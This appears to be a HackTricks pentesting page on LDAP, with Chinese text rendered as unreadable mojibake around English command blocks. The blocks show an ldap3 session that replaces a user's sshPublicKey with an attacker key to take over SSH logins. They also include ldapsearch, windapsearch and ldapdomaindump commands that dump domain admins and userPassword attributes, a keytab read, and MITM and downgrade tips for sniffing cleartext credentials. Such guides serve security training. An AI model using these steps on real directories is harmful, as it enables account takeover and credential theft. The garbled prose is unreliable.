<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>389, 636, 3268, 3269 - Pentesting LDAP</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="389-636-3268-3269---pentesting-ldap"><a class="header" href="#389-636-3268-3269---pentesting-ldap">389, 636, 3268, 3269 - Pentesting LDAP</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
<p><strong>LDAP</strong>ï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼‰çš„ä¸»è¦ç”¨é€”æ˜¯å®šä½å„ç§å®ä½“ï¼Œå¦‚ç»„ç»‡ã€ä¸ªäººä»¥åŠç½‘ç»œä¸­çš„èµ„æºï¼Œå¦‚æ–‡ä»¶å’Œè®¾å¤‡ï¼ŒåŒ…æ‹¬å…¬å…±å’Œç§æœ‰ç½‘ç»œã€‚ä¸å…¶å‰èº« DAP ç›¸æ¯”ï¼Œå®ƒæä¾›äº†ä¸€ç§æ›´ç®€åŒ–çš„æ–¹æ³•ï¼Œä»£ç å ç”¨æ›´å°ã€‚</p>
<p>LDAP ç›®å½•çš„ç»“æ„å…è®¸å®ƒä»¬åˆ†å¸ƒåœ¨å¤šä¸ªæœåŠ¡å™¨ä¸Šï¼Œæ¯ä¸ªæœåŠ¡å™¨éƒ½å­˜å‚¨ä¸€ä¸ª<strong>å¤åˆ¶</strong>å’Œ<strong>åŒæ­¥</strong>çš„ç›®å½•ç‰ˆæœ¬ï¼Œç§°ä¸ºç›®å½•ç³»ç»Ÿä»£ç†ï¼ˆDSAï¼‰ã€‚å¤„ç†è¯·æ±‚çš„è´£ä»»å®Œå…¨ç”± LDAP æœåŠ¡å™¨æ‰¿æ‹…ï¼Œå¿…è¦æ—¶å¯ä»¥ä¸å…¶ä»– DSA é€šä¿¡ï¼Œä»¥å‘è¯·æ±‚è€…æä¾›ç»Ÿä¸€çš„å“åº”ã€‚</p>
<p>LDAP ç›®å½•çš„ç»„ç»‡ç»“æ„ç±»ä¼¼äº<strong>æ ‘å½¢å±‚æ¬¡ç»“æ„ï¼Œä»æ ¹ç›®å½•å¼€å§‹</strong>ã€‚è¿™å‘ä¸‹åˆ†æ”¯åˆ°å›½å®¶ï¼Œç„¶åè¿›ä¸€æ­¥åˆ’åˆ†ä¸ºç»„ç»‡ï¼Œå†åˆ°ä»£è¡¨å„ä¸ªéƒ¨é—¨æˆ–å•ä½çš„ç»„ç»‡å•ä½ï¼Œæœ€ç»ˆè¾¾åˆ°åŒ…æ‹¬ä¸ªäººå’Œå…±äº«èµ„æºï¼ˆå¦‚æ–‡ä»¶å’Œæ‰“å°æœºï¼‰åœ¨å†…çš„ä¸ªä½“å®ä½“çº§åˆ«ã€‚</p>
<p><strong>é»˜è®¤ç«¯å£ï¼š</strong> 389 å’Œ 636ï¼ˆldapsï¼‰ã€‚å…¨å±€ç›®å½•ï¼ˆActiveDirectory ä¸­çš„ LDAPï¼‰é»˜è®¤åœ¨ç«¯å£ 3268 å’Œ 3269ï¼ˆLDAPSï¼‰ä¸Šå¯ç”¨ã€‚</p>
<pre><code>PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
</code></pre>
<h3 id="ldap-æ•°æ®äº¤æ¢æ ¼å¼"><a class="header" href="#ldap-æ•°æ®äº¤æ¢æ ¼å¼">LDAP æ•°æ®äº¤æ¢æ ¼å¼</a></h3>
<p>LDIFï¼ˆLDAP æ•°æ®äº¤æ¢æ ¼å¼ï¼‰å°†ç›®å½•å†…å®¹å®šä¹‰ä¸ºä¸€ç»„è®°å½•ã€‚å®ƒè¿˜å¯ä»¥è¡¨ç¤ºæ›´æ–°è¯·æ±‚ï¼ˆæ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤ã€é‡å‘½åï¼‰ã€‚</p>
<pre><code class="language-bash">dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
</code></pre>
<ul>
<li>ç¬¬1-3è¡Œå®šä¹‰äº†é¡¶çº§åŸŸlocal</li>
<li>ç¬¬5-8è¡Œå®šä¹‰äº†ä¸€çº§åŸŸmoneycorp (moneycorp.local)</li>
<li>ç¬¬10-16è¡Œå®šä¹‰äº†2ä¸ªç»„ç»‡å•ä½ï¼šdevå’Œsales</li>
<li>ç¬¬18-26è¡Œåˆ›å»ºäº†ä¸€ä¸ªåŸŸå¯¹è±¡å¹¶åˆ†é…äº†å¸¦æœ‰å€¼çš„å±æ€§</li>
</ul>
<h2 id="å†™å…¥æ•°æ®"><a class="header" href="#å†™å…¥æ•°æ®">å†™å…¥æ•°æ®</a></h2>
<p>è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨å¯ä»¥ä¿®æ”¹å€¼ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿæ‰§è¡Œéå¸¸æœ‰è¶£çš„æ“ä½œã€‚ä¾‹å¦‚ï¼Œæƒ³è±¡ä¸€ä¸‹æ‚¨<strong>å¯ä»¥æ›´æ”¹æ‚¨çš„ç”¨æˆ·æˆ–ä»»ä½•ç”¨æˆ·çš„â€œsshPublicKeyâ€ä¿¡æ¯</strong>ã€‚å¦‚æœè¿™ä¸ªå±æ€§å­˜åœ¨ï¼Œé‚£ä¹ˆ<strong>sshå¾ˆå¯èƒ½æ˜¯ä»LDAPè¯»å–å…¬é’¥</strong>ã€‚å¦‚æœæ‚¨å¯ä»¥ä¿®æ”¹ç”¨æˆ·çš„å…¬é’¥ï¼Œæ‚¨<strong>å°†èƒ½å¤Ÿä»¥è¯¥ç”¨æˆ·èº«ä»½ç™»å½•ï¼Œå³ä½¿åœ¨sshä¸­æœªå¯ç”¨å¯†ç è®¤è¯</strong>ã€‚</p>
<pre><code class="language-bash"># Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
&gt;&gt;&gt; import ldap3
&gt;&gt;&gt; server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
&gt;&gt;&gt; connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
&gt;&gt;&gt; connection.bind()
True
&gt;&gt;&gt; connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
&gt;&gt;&gt; connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
</code></pre>
<h2 id="sniff-clear-text-credentials"><a class="header" href="#sniff-clear-text-credentials">Sniff clear text credentials</a></h2>
<p>å¦‚æœ LDAP åœ¨æ²¡æœ‰ SSL çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œä½ å¯ä»¥ <strong>åœ¨ç½‘ç»œä¸­å—…æ¢æ˜æ–‡å‡­è¯</strong>ã€‚</p>
<p>æ­¤å¤–ï¼Œä½ å¯ä»¥åœ¨ <strong>LDAP æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´</strong> æ‰§è¡Œ <strong>MITM</strong> æ”»å‡»ã€‚åœ¨è¿™é‡Œï¼Œä½ å¯ä»¥è¿›è¡Œ <strong>é™çº§æ”»å‡»</strong>ï¼Œä½¿å®¢æˆ·ç«¯ä½¿ç”¨ <strong>æ˜æ–‡å‡­è¯</strong> ç™»å½•ã€‚</p>
<p><strong>å¦‚æœä½¿ç”¨ SSL</strong>ï¼Œä½ å¯ä»¥å°è¯•åƒä¸Šé¢æåˆ°çš„é‚£æ ·è¿›è¡Œ <strong>MITM</strong>ï¼Œä½†æä¾›ä¸€ä¸ª <strong>è™šå‡è¯ä¹¦</strong>ï¼Œå¦‚æœ <strong>ç”¨æˆ·æ¥å—å®ƒ</strong>ï¼Œä½ å°±èƒ½å¤Ÿé™çº§è®¤è¯æ–¹æ³•å¹¶å†æ¬¡æŸ¥çœ‹å‡­è¯ã€‚</p>
<h2 id="anonymous-access"><a class="header" href="#anonymous-access">Anonymous Access</a></h2>
<h3 id="bypass-tls-sni-check"><a class="header" href="#bypass-tls-sni-check">Bypass TLS SNI check</a></h3>
<p>æ ¹æ® <a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/"><strong>è¿™ç¯‡æ–‡ç« </strong></a>ï¼Œä»…é€šè¿‡ä½¿ç”¨ä»»æ„åŸŸåï¼ˆå¦‚ company.comï¼‰è®¿é—® LDAP æœåŠ¡å™¨ï¼Œä»–èƒ½å¤Ÿä»¥åŒ¿åç”¨æˆ·çš„èº«ä»½è”ç³» LDAP æœåŠ¡å¹¶æå–ä¿¡æ¯ï¼š</p>
<pre><code class="language-bash">ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
</code></pre>
<h3 id="ldap-åŒ¿åç»‘å®š"><a class="header" href="#ldap-åŒ¿åç»‘å®š">LDAP åŒ¿åç»‘å®š</a></h3>
<p><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled">LDAP åŒ¿åç»‘å®š</a> å…è®¸ <strong>æœªè®¤è¯çš„æ”»å‡»è€…</strong> ä»åŸŸä¸­æ£€ç´¢ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€ç”¨æˆ·å¸æˆ·å±æ€§å’ŒåŸŸå¯†ç ç­–ç•¥çš„å®Œæ•´åˆ—è¡¨ã€‚è¿™æ˜¯ä¸€ç§ <strong>é—ç•™é…ç½®</strong>ï¼Œè‡ª Windows Server 2003 èµ·ï¼Œä»…å…è®¸ç»è¿‡è®¤è¯çš„ç”¨æˆ·å‘èµ· LDAP è¯·æ±‚ã€‚<br />
ç„¶è€Œï¼Œç®¡ç†å‘˜å¯èƒ½éœ€è¦ <strong>è®¾ç½®ç‰¹å®šåº”ç”¨ç¨‹åºä»¥å…è®¸åŒ¿åç»‘å®š</strong>ï¼Œå¹¶ç»™äºˆè¶…è¿‡é¢„æœŸçš„è®¿é—®æƒé™ï¼Œä»è€Œä½¿æœªè®¤è¯ç”¨æˆ·èƒ½å¤Ÿè®¿é—® AD ä¸­çš„æ‰€æœ‰å¯¹è±¡ã€‚</p>
<h2 id="æœ‰æ•ˆå‡­æ®"><a class="header" href="#æœ‰æ•ˆå‡­æ®">æœ‰æ•ˆå‡­æ®</a></h2>
<p>å¦‚æœæ‚¨æ‹¥æœ‰æœ‰æ•ˆçš„å‡­æ®ç™»å½•åˆ° LDAP æœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è½¬å‚¨æœ‰å…³åŸŸç®¡ç†å‘˜çš„æ‰€æœ‰ä¿¡æ¯ï¼š</p>
<p><a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a></p>
<pre><code class="language-bash">pip3 install ldapdomaindump
ldapdomaindump &lt;IP&gt; [-r &lt;IP&gt;] -u '&lt;domain&gt;\&lt;username&gt;' -p '&lt;password&gt;' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
</code></pre>
<h3 id="æš´åŠ›ç ´è§£"><a class="header" href="#æš´åŠ›ç ´è§£"><a href="../generic-hacking/brute-force.html#ldap">æš´åŠ›ç ´è§£</a></a></h3>
<h2 id="æšä¸¾"><a class="header" href="#æšä¸¾">æšä¸¾</a></h2>
<h3 id="è‡ªåŠ¨åŒ–"><a class="header" href="#è‡ªåŠ¨åŒ–">è‡ªåŠ¨åŒ–</a></h3>
<p>ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œæ‚¨å°†èƒ½å¤ŸæŸ¥çœ‹<strong>å…¬å…±ä¿¡æ¯</strong>ï¼ˆå¦‚åŸŸåï¼‰<strong>:</strong></p>
<pre><code class="language-bash">nmap -n -sV --script "ldap* and not brute" &lt;IP&gt; #Using anonymous credentials
</code></pre>
<h3 id="python"><a class="header" href="#python">Python</a></h3>
<details>
<summary>æŸ¥çœ‹ä½¿ç”¨pythonè¿›è¡ŒLDAPæšä¸¾</summary>
<p>æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨python <strong>æšä¸¾LDAPï¼Œæ— è®ºæ˜¯å¦ä½¿ç”¨å‡­æ®</strong>ï¼š <code>pip3 install ldap3</code></p>
<p>é¦–å…ˆå°è¯•<strong>ä¸ä½¿ç”¨</strong>å‡­æ®è¿›è¡Œ<strong>è¿æ¥</strong>ï¼š</p>
<pre><code class="language-bash">&gt;&gt;&gt; import ldap3
&gt;&gt;&gt; server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
&gt;&gt;&gt; connection = ldap3.Connection(server)
&gt;&gt;&gt; connection.bind()
True
&gt;&gt;&gt; server.info
</code></pre>
<p>å¦‚æœå“åº”ä¸º <code>True</code>ï¼Œå¦‚å‰é¢çš„ç¤ºä¾‹æ‰€ç¤ºï¼Œæ‚¨å¯ä»¥ä»ä»¥ä¸‹ä½ç½®è·å–ä¸€äº› <strong>æœ‰è¶£çš„æ•°æ®</strong>ï¼Œä¾‹å¦‚ <strong>å‘½åä¸Šä¸‹æ–‡</strong> æˆ– <strong>åŸŸå</strong> æœåŠ¡å™¨ï¼š</p>
<pre><code class="language-bash">&gt;&gt;&gt; server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
</code></pre>
<p>ä¸€æ—¦ä½ æ‹¥æœ‰å‘½åä¸Šä¸‹æ–‡ï¼Œä½ å¯ä»¥è¿›è¡Œä¸€äº›æ›´æœ‰è¶£çš„æŸ¥è¯¢ã€‚è¿™ä¸ªç®€å•çš„æŸ¥è¯¢åº”è¯¥ä¼šæ˜¾ç¤ºç›®å½•ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼š</p>
<pre><code class="language-bash">&gt;&gt;&gt; connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&amp;(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
&gt;&gt; connection.entries
</code></pre>
<p>æˆ–<strong>dump</strong>æ•´ä¸ªldapï¼š</p>
<pre><code class="language-bash">&gt;&gt; connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&amp;(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
&gt;&gt;&gt; connection.entries
</code></pre>
</details>
<h3 id="windapsearch"><a class="header" href="#windapsearch">windapsearch</a></h3>
<p><a href="https://github.com/ropnop/windapsearch"><strong>Windapsearch</strong></a> æ˜¯ä¸€ä¸ª Python è„šæœ¬ï¼Œç”¨äºé€šè¿‡åˆ©ç”¨ LDAP æŸ¥è¯¢ä» Windows åŸŸä¸­ <strong>æšä¸¾ç”¨æˆ·ã€ç»„å’Œè®¡ç®—æœº</strong>ã€‚</p>
<pre><code class="language-bash"># Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
</code></pre>
<h3 id="ldapsearch"><a class="header" href="#ldapsearch">ldapsearch</a></h3>
<p>æ£€æŸ¥ç©ºå‡­æ®æˆ–æ‚¨çš„å‡­æ®æ˜¯å¦æœ‰æ•ˆï¼š</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '' -w '' -b "DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<pre><code class="language-bash"># CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
</code></pre>
<p>å¦‚æœä½ å‘ç°æŸäº›å†…å®¹è¯´â€œ<em>bind å¿…é¡»å®Œæˆ</em>â€æ„å‘³ç€å‡­æ®ä¸æ­£ç¡®ã€‚</p>
<p>ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä»ä¸€ä¸ªåŸŸä¸­æå–<strong>æ‰€æœ‰å†…å®¹</strong>ï¼š</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
</code></pre>
<p>æå– <strong>ç”¨æˆ·</strong>ï¼š</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
#Example: ldapsearch -x -H ldap://&lt;IP&gt; -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
</code></pre>
<p>æå– <strong>è®¡ç®—æœº</strong>ï¼š</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Computers,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>æå– <strong>æˆ‘çš„ä¿¡æ¯</strong>ï¼š</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=&lt;MY NAME&gt;,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>æå– <strong>Domain Admins</strong>:</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Domain Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>æå– <strong>Domain Users</strong>:</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Domain Users,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>æå– <strong>Enterprise Admins</strong>:</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Enterprise Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>æå– <strong>Administrators</strong>:</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Administrators,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>æå– <strong>Remote Desktop Group</strong>:</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Remote Desktop Users,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>è¦æŸ¥çœ‹æ‚¨æ˜¯å¦å¯ä»¥è®¿é—®ä»»ä½•å¯†ç ï¼Œæ‚¨å¯ä»¥åœ¨æ‰§è¡Œå…¶ä¸­ä¸€ä¸ªæŸ¥è¯¢åä½¿ç”¨ grepï¼š</p>
<pre><code class="language-bash">&lt;ldapsearchcmd...&gt; | grep -i -A2 -B2 "userpas"
</code></pre>
<p>è¯·æ³¨æ„ï¼Œæ‚¨åœ¨è¿™é‡Œæ‰¾åˆ°çš„å¯†ç å¯èƒ½ä¸æ˜¯çœŸå®çš„...</p>
<h4 id="pbis"><a class="header" href="#pbis">pbis</a></h4>
<p>æ‚¨å¯ä»¥ä»è¿™é‡Œä¸‹è½½ <strong>pbis</strong>: <a href="https://github.com/BeyondTrust/pbis-open/">https://github.com/BeyondTrust/pbis-open/</a>ï¼Œå®ƒé€šå¸¸å®‰è£…åœ¨ <code>/opt/pbis</code>ã€‚<br />
<strong>Pbis</strong> å…è®¸æ‚¨è½»æ¾è·å–åŸºæœ¬ä¿¡æ¯ï¼š</p>
<pre><code class="language-bash">#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user &lt;username&gt;
./lsa list-groups-for-user &lt;username&gt;
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n &lt;Username&gt; | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n &lt;username&gt; -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
</code></pre>
